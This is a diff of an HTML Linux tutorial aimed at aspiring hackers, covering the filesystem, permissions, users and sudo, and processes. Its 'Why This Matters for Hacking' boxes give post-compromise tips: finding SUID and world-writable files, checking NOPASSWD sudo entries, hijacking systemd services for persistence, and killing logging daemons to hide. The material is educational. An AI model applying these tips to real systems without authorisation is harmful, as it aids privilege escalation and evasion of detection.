-                        <h4 style="color: #00ff88; margin-bottom: 1rem;"><code>/root</code> — Root User's Home</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8;">
-                            The superuser's personal directory. Not in <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/home</code>—kept separate for security. Only root can access.
-                        </p>
-                    </div>
-
-                    <div style="background: rgba(0,0,0,0.3); padding: 2rem; border-radius: 15px; margin: 1.5rem 0; border-left: 4px solid #9370db;">
-                        <h4 style="color: #9370db; margin-bottom: 1rem;"><code>/proc</code> and <code>/sys</code> — Virtual File Systems</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            These don't exist on disk—they're <strong>generated on-the-fly</strong> by the kernel. Represent running processes and system info.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8;">
-                            <strong>Example:</strong> <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">cat /proc/cpuinfo</code> shows CPU details. <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/proc/[PID]</code> directories contain info about each running process.
-                        </p>
-                    </div>
-
-                    <h3 style="color: #33d4ff; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Navigating the File System</h3>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code># Print working directory
-pwd
-
-# List files (long format, human-readable sizes, hidden files)
-ls -lah
-
-# Change directory
-cd /etc
-
-# Go up one level
-cd ..
-
-# Go to home directory
-cd ~
-
-# Go to previous directory
-cd -
-
-# Find files by name
-find / -name "config.php" 2>/dev/null
-
-# Search for text in files
-grep -r "password" /etc 2>/dev/null
-</code></pre>
-                    </div>
-
-                    <div style="background: rgba(255,200,0,0.15); padding: 1.5rem; border-radius: 10px; margin: 2rem 0; border-left: 4px solid #ffc800;">
-                        <h4 style="color: #ffc800; margin-bottom: 0.5rem;">🔥 Why This Matters for Hacking</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin: 0;">
-                            When you compromise a Linux box, you need to navigate instantly. Knowing <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/etc/shadow</code> has passwords, <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/var/log</code> has evidence, and <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/tmp</code> allows uploads saves precious time during an engagement. Defenders can't hide what you already know exists.
-                        </p>
-                    </div>
-
-                    <div style="background: rgba(0,204,255,0.1); padding: 1.5rem; border-radius: 10px; margin: 2rem 0;">
-                        <h4 style="color: #00ccff; margin-bottom: 1rem;">🎯 Quick Check</h4>
-                        <ul style="font-size: 1.05rem; line-height: 1.9; margin: 0;">
-                            <li>Where are system configuration files stored?</li>
-                            <li>Which directory contains user home folders?</li>
-                            <li>What's the difference between <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/bin</code> and <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/usr/bin</code>?</li>
-                            <li>Why is <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/tmp</code> attractive for attackers?</li>
-                        </ul>
-                    </div>
+                <div class="card">
+                    <h4>⌨️ Terminal Commands</h4>
+                    <p>Navigation, file manipulation, text processing - the commands you'll use daily.</p>
                 </div>
-
-                <!-- Topic 3: Permissions Mastery -->
-                <div style="background: linear-gradient(135deg, rgba(255,107,107,0.15) 0%, rgba(255,50,50,0.15) 100%); padding: 3rem; border-radius: 20px; margin: 3rem 0; border: 2px solid rgba(255,107,107,0.3);">
-                    <h2 style="color: #ff6b6b; font-size: 1.8rem; margin-bottom: 1.5rem;">🔐 Topic 3: Linux Permissions — The Security Gatekeeper</h2>
-                    
-                    <h3 style="color: #ff8585; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Understanding the Permission Model</h3>
-                    <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        Imagine a <strong>nightclub with three VIP sections</strong>:
-                    </p>
-                    <ul style="font-size: 1.05rem; line-height: 1.9; margin: 0 0 1.5rem 2rem;">
-                        <li><strong>User (u):</strong> The owner—you, the person who created the file</li>
-                        <li><strong>Group (g):</strong> Your crew—users in the same group as the file</li>
-                        <li><strong>Others (o):</strong> Everyone else—random people on the system</li>
-                    </ul>
-                    <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        Each section gets <strong>three types of access</strong>:
-                    </p>
-                    <ul style="font-size: 1.05rem; line-height: 1.9; margin: 0 0 1.5rem 2rem;">
-                        <li><strong>Read (r):</strong> View the file contents / List directory contents</li>
-                        <li><strong>Write (w):</strong> Modify the file / Add/delete files in directory</li>
-                        <li><strong>Execute (x):</strong> Run the file as a program / Enter the directory</li>
-                    </ul>
-
-                    <h3 style="color: #ff8585; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Reading Permission Strings</h3>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code>$ ls -l important_file.txt
--rw-r--r-- 1 hacker hackers 4096 Dec 15 10:30 important_file.txt
-</code></pre>
-                    </div>
-                    <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        Let's decode <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px; color: #00ccff;">-rw-r--r--</code>:
-                    </p>
-                    <ul style="font-size: 1.05rem; line-height: 1.9; margin: 0 0 1.5rem 2rem;">
-                        <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">-</code> — File type (<code>-</code> = file, <code>d</code> = directory, <code>l</code> = symbolic link)</li>
-                        <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">rw-</code> — User can read and write</li>
-                        <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">r--</code> — Group can only read</li>
-                        <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">r--</code> — Others can only read</li>
-                    </ul>
-
-                    <h3 style="color: #ff8585; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Numeric (Octal) Notation</h3>
-                    <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        Permissions have <strong>numeric equivalents</strong>:
-                    </p>
-                    <div style="background: rgba(0,0,0,0.3); padding: 2rem; border-radius: 15px; margin: 1.5rem 0;">
-                        <ul style="font-size: 1.05rem; line-height: 1.9; margin: 0;">
-                            <li><strong>r (read) = 4</strong></li>
-                            <li><strong>w (write) = 2</strong></li>
-                            <li><strong>x (execute) = 1</strong></li>
-                        </ul>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-top: 1.5rem;">
-                            <strong>Add them up:</strong>
-                        </p>
-                        <ul style="font-size: 1.05rem; line-height: 1.9; margin: 1rem 0 0 2rem;">
-                            <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">7 (rwx)</code> = 4+2+1 = Full access</li>
-                            <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">6 (rw-)</code> = 4+2 = Read and write</li>
-                            <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">5 (r-x)</code> = 4+1 = Read and execute</li>
-                            <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">4 (r--)</code> = 4 = Read only</li>
-                            <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">0 (---)</code> = 0 = No access</li>
-                        </ul>
-                    </div>
-                    <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        <strong>Example:</strong> <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px; color: #00ccff;">chmod 644 file.txt</code>
-                    </p>
-                    <ul style="font-size: 1.05rem; line-height: 1.9; margin: 0 0 1.5rem 2rem;">
-                        <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">6</code> (rw-) — User can read/write</li>
-                        <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">4</code> (r--) — Group can read</li>
-                        <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">4</code> (r--) — Others can read</li>
-                    </ul>
-
-                    <h3 style="color: #ff8585; font-size: 1.4rem; margin: 2rem 0 1rem 0;">chmod — Change Mode (Permissions)</h3>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code># Numeric method
-chmod 755 script.sh   # rwxr-xr-x (common for executables)
-chmod 600 secrets.txt # rw------- (private files)
-chmod 777 public/     # rwxrwxrwx (DANGEROUS - everyone full access)
-
-# Symbolic method
-chmod u+x script.sh   # Add execute for user
-chmod g-w file.txt    # Remove write from group
-chmod o=r file.txt    # Set others to read-only
-chmod a+r file.txt    # Add read for all (a = all)
-
-# Recursive (for directories)
-chmod -R 755 /var/www # Apply to all files inside
-</code></pre>
-                    </div>
-
-                    <h3 style="color: #ff8585; font-size: 1.4rem; margin: 2rem 0 1rem 0;">chown — Change Owner</h3>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code># Change owner
-sudo chown alice file.txt
-
-# Change owner and group
-sudo chown alice:developers file.txt
-
-# Recursive
-sudo chown -R www-data:www-data /var/www/html
-</code></pre>
-                    </div>
-
-                    <h3 style="color: #ff8585; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Special Permissions</h3>
-                    
-                    <div style="background: rgba(0,0,0,0.3); padding: 2rem; border-radius: 15px; margin: 1.5rem 0; border-left: 4px solid #ffc800;">
-                        <h4 style="color: #ffc800; margin-bottom: 1rem;">SUID (Set User ID) — 4000</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            When set on an executable, the file <strong>runs with the owner's permissions</strong>, not the executor's.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            <strong>Example:</strong> <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/usr/bin/passwd</code> has SUID. When you change your password, it temporarily runs as root to modify <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/etc/shadow</code>.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8;">
-                            <strong>Hacker gold:</strong> SUID binaries are <em>prime privilege escalation targets</em>. Find them: <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">find / -perm -4000 2>/dev/null</code>
-                        </p>
-                    </div>
-
-                    <div style="background: rgba(0,0,0,0.3); padding: 2rem; border-radius: 15px; margin: 1.5rem 0; border-left: 4px solid #00ccff;">
-                        <h4 style="color: #00ccff; margin-bottom: 1rem;">SGID (Set Group ID) — 2000</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            On files: Runs with group permissions. On directories: New files inherit the directory's group.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8;">
-                            <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">chmod 2755 shared_dir/</code>
-                        </p>
-                    </div>
-
-                    <div style="background: rgba(0,0,0,0.3); padding: 2rem; border-radius: 15px; margin: 1.5rem 0; border-left: 4px solid #ff1744;">
-                        <h4 style="color: #ff1744; margin-bottom: 1rem;">Sticky Bit — 1000</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            On directories: Only the <strong>file owner</strong> can delete their files, even if others have write access to the directory.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            <strong>Example:</strong> <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/tmp</code> has the sticky bit. You can't delete someone else's files there.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8;">
-                            <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">chmod 1777 /tmp</code> (represented by <code>t</code> in <code>drwxrwxrwt</code>)
-                        </p>
-                    </div>
-
-                    <h3 style="color: #ff8585; font-size: 1.4rem; margin: 2rem 0 1rem 0;">umask — Default Permissions</h3>
-                    <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">umask</code> defines the <strong>default permissions</strong> for new files/directories by <em>subtracting</em> from maximum permissions.
-                    </p>
-                    <ul style="font-size: 1.05rem; line-height: 1.9; margin: 0 0 1.5rem 2rem;">
-                        <li>Max for files: <code>666</code> (rw-rw-rw-)</li>
-                        <li>Max for directories: <code>777</code> (rwxrwxrwx)</li>
-                    </ul>
-                    <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        <strong>Example:</strong> If <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">umask</code> is <code>022</code>:
-                    </p>
-                    <ul style="font-size: 1.05rem; line-height: 1.9; margin: 0 0 1.5rem 2rem;">
-                        <li>New files: <code>666 - 022 = 644</code> (rw-r--r--)</li>
-                        <li>New directories: <code>777 - 022 = 755</code> (rwxr-xr-x)</li>
-                    </ul>
-
-                    <div style="background: rgba(255,200,0,0.15); padding: 1.5rem; border-radius: 10px; margin: 2rem 0; border-left: 4px solid #ffc800;">
-                        <h4 style="color: #ffc800; margin-bottom: 0.5rem;">🔥 Why This Matters for Hacking</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin: 0;">
-                            Privilege escalation <strong>depends</strong> on finding misconfigurations. A world-writable config file (<code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">777</code>)? You can modify it. A SUID binary you can exploit? Instant root. Defenders mess up permissions constantly—your job is to find where. Commands like <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">find / -writable 2>/dev/null</code> become your best friend.
-                        </p>
-                    </div>
-
-                    <div style="background: rgba(0,204,255,0.1); padding: 1.5rem; border-radius: 10px; margin: 2rem 0;">
-                        <h4 style="color: #00ccff; margin-bottom: 1rem;">🎯 Quick Check</h4>
-                        <ul style="font-size: 1.05rem; line-height: 1.9; margin: 0;">
-                            <li>What does <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">chmod 755 script.sh</code> mean?</li>
-                            <li>How do you find all SUID files on a system?</li>
-                            <li>Why is <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">chmod 777</code> dangerous?</li>
-                            <li>What's the purpose of the sticky bit on <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/tmp</code>?</li>
-                        </ul>
-                    </div>
+                <div class="card">
+                    <h4>🔒 Permissions Deep Dive</h4>
+                    <p>The security model that protects (and is exploited on) every Linux system.</p>
                 </div>
+                <div class="card">
+                    <h4>⚙️ Process Management</h4>
+                    <p>How programs run, how to control them, how to hide your presence.</p>
+                </div>
+                <div class="card">
+                    <h4>📜 Bash Scripting</h4>
+                    <p>Automate everything. Reconnaissance, exploitation, post-exploitation - scripted.</p>
+                </div>
+            </div>
+        </section>
 
-                <!-- Topic 4: User Management & sudo -->
-                <div style="background: linear-gradient(135deg, rgba(255,200,0,0.15) 0%, rgba(255,150,0,0.15) 100%); padding: 3rem; border-radius: 20px; margin: 3rem 0; border: 2px solid rgba(255,200,0,0.3);">
-                    <h2 style="color: #ffc800; font-size: 1.8rem; margin-bottom: 1.5rem;">👥 Topic 4: User Management & sudo — Controlling Access</h2>
-                    
-                    <h3 style="color: #ffd54f; font-size: 1.4rem; margin: 2rem 0 1rem 0;">User Accounts</h3>
-                    <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        Linux is multi-user by design. Every process runs as a user. Every file belongs to a user. Understanding user management = understanding system security.
-                    </p>
+        <section id="why-linux" class="section">
+            <h2 class="section-title">Why Linux is the Hacker's Operating System</h2>
+            <p class="section-intro">Before we dive into commands and techniques, you need to understand WHY Linux dominates the security world. This isn't about preference - it's about capability. Once you understand these reasons, you'll never look at Windows the same way again.</p>
 
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code># Create new user
-sudo useradd -m -s /bin/bash alice
+            <div class="metaphor-box">
+                <h4>🚗 The Car Metaphor</h4>
+                <p>Windows is like an automatic car with the hood welded shut:</p>
+                <ul style="margin-top: 1rem;">
+                    <li>Easy to drive (point, click, go)</li>
+                    <li>Can't see how the engine works</li>
+                    <li>Can't modify or repair it yourself</li>
+                    <li>Limited to what the manufacturer allows</li>
+                    <li>When something breaks, you're helpless</li>
+                </ul>
+                <p style="margin-top: 1rem;">Linux is like a manual transmission car with the hood always open:</p>
+                <ul style="margin-top: 0.5rem;">
+                    <li>Requires more skill to operate</li>
+                    <li>You can see every component</li>
+                    <li>Modify anything you want</li>
+                    <li>Rebuild the entire engine if needed</li>
+                    <li>Complete control = complete understanding</li>
+                </ul>
+                <p style="margin-top: 1rem;">Hackers need to understand systems at the deepest level. You can't do that with a welded hood. You need to see the engine, touch the parts, and know exactly how everything connects.</p>
+            </div>
 
-# Set password
-sudo passwd alice
-
-# Add user to group
-sudo usermod -aG sudo alice  # Add to sudoers
-sudo usermod -aG docker alice  # Add to docker group
-
-# Delete user
-sudo userdel -r alice  # -r removes home directory
-
-# View user info
-id alice
-whoami
-w  # Who's logged in
-last  # Login history
-</code></pre>
-                    </div>
-
-                    <h3 style="color: #ffd54f; font-size: 1.4rem; margin: 2rem 0 1rem 0;">The /etc/passwd File</h3>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code>root:x:0:0:root:/root:/bin/bash
-alice:x:1001:1001:Alice Smith:/home/alice:/bin/bash
-</code></pre>
-                    </div>
-                    <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        Format: <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">username:password:UID:GID:comment:home:shell</code>
-                    </p>
-                    <ul style="font-size: 1.05rem; line-height: 1.9; margin: 0 0 1.5rem 2rem;">
-                        <li><strong>password:</strong> <code>x</code> means password stored in <code>/etc/shadow</code></li>
-                        <li><strong>UID 0:</strong> Root user (superuser)</li>
-                        <li><strong>UID 1-999:</strong> System accounts</li>
-                        <li><strong>UID 1000+:</strong> Regular users</li>
+            <h3>The Technical Reasons Linux Dominates Security</h3>
+            <div class="card-grid">
+                <div class="card">
+                    <h4>1. Open Source = Total Transparency</h4>
+                    <p>Every single line of Linux code is publicly available. You can read:</p>
+                    <ul style="margin-top: 1rem;">
+                        <li>How the kernel schedules processes</li>
+                        <li>How permissions are checked</li>
+                        <li>How network packets are handled</li>
+                        <li>How system calls work</li>
                     </ul>
-
-                    <h3 style="color: #ffd54f; font-size: 1.4rem; margin: 2rem 0 1rem 0;">The /etc/shadow File</h3>
-                    <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        Contains actual password hashes. Only readable by root.
-                    </p>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code>alice:$6$randomsalt$hashedpassword:19000:0:99999:7:::
-</code></pre>
-                    </div>
-
-                    <h3 style="color: #ffd54f; font-size: 1.4rem; margin: 2rem 0 1rem 0;">sudo — Superuser Do</h3>
-                    <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px; color: #00ccff;">sudo</code> lets regular users execute commands as root (temporarily).
-                    </p>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code># Run command as root
-sudo apt update
-
-# Open root shell
-sudo -i  # Login shell
-sudo -s  # Non-login shell
-
-# Run as different user
-sudo -u alice command
-
-# Edit sudoers file (SAFELY)
-sudo visudo  # Never edit /etc/sudoers directly!
-
-# Check sudo privileges
-sudo -l
-</code></pre>
-                    </div>
-
-                    <h3 style="color: #ffd54f; font-size: 1.4rem; margin: 2rem 0 1rem 0;">sudoers Configuration</h3>
-                    <div style="background: rgba(0,0,0,0.3); padding: 2rem; border-radius: 15px; margin: 1.5rem 0;">
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            <strong>Example /etc/sudoers entries:</strong>
-                        </p>
-                        <pre style="margin: 0; color: #00ccff; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code># Allow alice to run any command
-alice ALL=(ALL:ALL) ALL
-
-# Allow developers group to run commands without password
-%developers ALL=(ALL) NOPASSWD: ALL
-
-# Allow specific commands only
-bob ALL=(ALL) /usr/bin/apt, /usr/bin/systemctl
-</code></pre>
-                    </div>
-
-                    <div style="background: rgba(255,200,0,0.15); padding: 1.5rem; border-radius: 10px; margin: 2rem 0; border-left: 4px solid #ffc800;">
-                        <h4 style="color: #ffc800; margin-bottom: 0.5rem;">🔥 Why This Matters for Hacking</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin: 0;">
-                            Privilege escalation often starts with misconfigured sudo. <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">sudo -l</code> reveals what you can run as root. Find <code>NOPASSWD</code> entries? Gold mine. Exploitable binaries in sudoers? Root access. Always check sudo configs during penetration tests.
-                        </p>
-                    </div>
-
-                    <div style="background: rgba(0,204,255,0.1); padding: 1.5rem; border-radius: 10px; margin: 2rem 0;">
-                        <h4 style="color: #00ccff; margin-bottom: 1rem;">🎯 Quick Check</h4>
-                        <ul style="font-size: 1.05rem; line-height: 1.9; margin: 0;">
-                            <li>How do you add a user to the sudo group?</li>
-                            <li>Where are password hashes stored?</li>
-                            <li>What command shows your current sudo privileges?</li>
-                            <li>Why is <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">NOPASSWD</code> in sudoers a security risk?</li>
-                        </ul>
-                    </div>
+                    <p style="margin-top: 1rem;">Windows is a black box - you're guessing how things work. With Linux, you KNOW because you can read the source code.</p>
                 </div>
-
-                <!-- Topic 5: Process Management -->
-                <div style="background: linear-gradient(135deg, rgba(0,255,136,0.15) 0%, rgba(0,200,100,0.15) 100%); padding: 3rem; border-radius: 20px; margin: 3rem 0; border: 2px solid rgba(0,255,136,0.3);">
-                    <h2 style="color: #00ff88; font-size: 1.8rem; margin-bottom: 1.5rem;">⚙️ Topic 5: Process Management — Controlling Running Programs</h2>
-                    
-                    <h3 style="color: #33ffa5; font-size: 1.4rem; margin: 2rem 0 1rem 0;">What IS a Process?</h3>
-                    <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        A process is a <strong>running instance of a program</strong>. When you execute <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">ls</code>, the kernel creates a process to run it.
-                    </p>
-                    <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        Every process has a <strong>PID</strong> (Process ID) — a unique number identifying it.
-                    </p>
-
-                    <h3 style="color: #33ffa5; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Viewing Processes</h3>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code># List all processes
-ps aux  # BSD style
-ps -ef  # System V style
-
-# Interactive process viewer
-top
-htop  # More user-friendly (install with apt/yum)
-
-# Process tree (parent-child relationships)
-pstree
-
-# Find specific process
-ps aux | grep apache2
-pgrep apache2  # Returns PIDs only
-</code></pre>
-                    </div>
-
-                    <h3 style="color: #33ffa5; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Killing Processes</h3>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code># Kill by PID
-kill 1234
-
-# Force kill (SIGKILL)
-kill -9 1234
-
-# Kill by name
-killall firefox
-pkill firefox
-
-# Common signals
-kill -15 1234  # SIGTERM (graceful shutdown)
-kill -9 1234   # SIGKILL (immediate termination)
-kill -1 1234   # SIGHUP (reload configuration)
-</code></pre>
-                    </div>
-
-                    <h3 style="color: #33ffa5; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Background & Foreground Jobs</h3>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code># Run in background
-command &
-
-# Suspend current process (Ctrl+Z), then background it
-bg
-
-# Bring to foreground
-fg
-
-# List jobs
-jobs
-
-# Detach process from terminal (keeps running after logout)
-nohup command &
-</code></pre>
-                    </div>
-
-                    <h3 style="color: #33ffa5; font-size: 1.4rem; margin: 2rem 0 1rem 0;">systemd & Services</h3>
-                    <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px; color: #00ccff;">systemd</code> is the modern init system managing services (daemons) on most Linux distributions.
-                    </p>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code># Start/stop services
-sudo systemctl start apache2
-sudo systemctl stop apache2
-sudo systemctl restart apache2
-sudo systemctl reload apache2  # Reload config without restart
-
-# Enable/disable autostart on boot
-sudo systemctl enable apache2
-sudo systemctl disable apache2
-
-# Check service status
-systemctl status apache2
-
-# List all services
-systemctl list-units --type=service
-
-# View service logs
-journalctl -u apache2 -f  # Follow logs live
-</code></pre>
-                    </div>
-
-                    <div style="background: rgba(255,200,0,0.15); padding: 1.5rem; border-radius: 10px; margin: 2rem 0; border-left: 4px solid #ffc800;">
-                        <h4 style="color: #ffc800; margin-bottom: 0.5rem;">🔥 Why This Matters for Hacking</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin: 0;">
-                            After exploiting a system, you need to understand what's running. <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">ps aux</code> reveals services you can target. Want persistence? Hijack a systemd service. Need to hide? Kill logging daemons. Process management is attack surface reconnaissance.
-                        </p>
-                    </div>
-
-                    <div style="background: rgba(0,204,255,0.1); padding: 1.5rem; border-radius: 10px; margin: 2rem 0;">
-                        <h4 style="color: #00ccff; margin-bottom: 1rem;">🎯 Quick Check</h4>
-                        <ul style="font-size: 1.05rem; line-height: 1.9; margin: 0;">
-                            <li>What's the difference between <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">kill</code> and <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">kill -9</code>?</li>
-                            <li>How do you view all running services?</li>
-                            <li>What command enables a service to start on boot?</li>
-                            <li>How can you keep a process running after logging out?</li>
-                        </ul>
-                    </div>
+                <div class="card">
+                    <h4>2. Complete Control</h4>
+                    <p>Linux lets you control absolutely EVERYTHING:</p>
+                    <ul style="margin-top: 1rem;">
+                        <li>Every running process</li>
+                        <li>Every network packet</li>
+                        <li>Every system call</li>
+                        <li>Every piece of hardware</li>
+                    </ul>
+                    <p style="margin-top: 1rem;">No "Administrator privileges required" pop-ups. No artificial restrictions. As root, you ARE the system.</p>
                 </div>
-
-                <!-- Topic 6: Package Management -->
-                <div style="background: linear-gradient(135deg, rgba(138,43,226,0.15) 0%, rgba(100,20,180,0.15) 100%); padding: 3rem; border-radius: 20px; margin: 3rem 0; border: 2px solid rgba(138,43,226,0.3);">
-                    <h2 style="color: #8a2be2; font-size: 1.8rem; margin-bottom: 1.5rem;">📦 Topic 6: Package Management — Installing Software Like a Pro</h2>
-                    
-                    <h3 style="color: #9370db; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Debian/Ubuntu (APT)</h3>
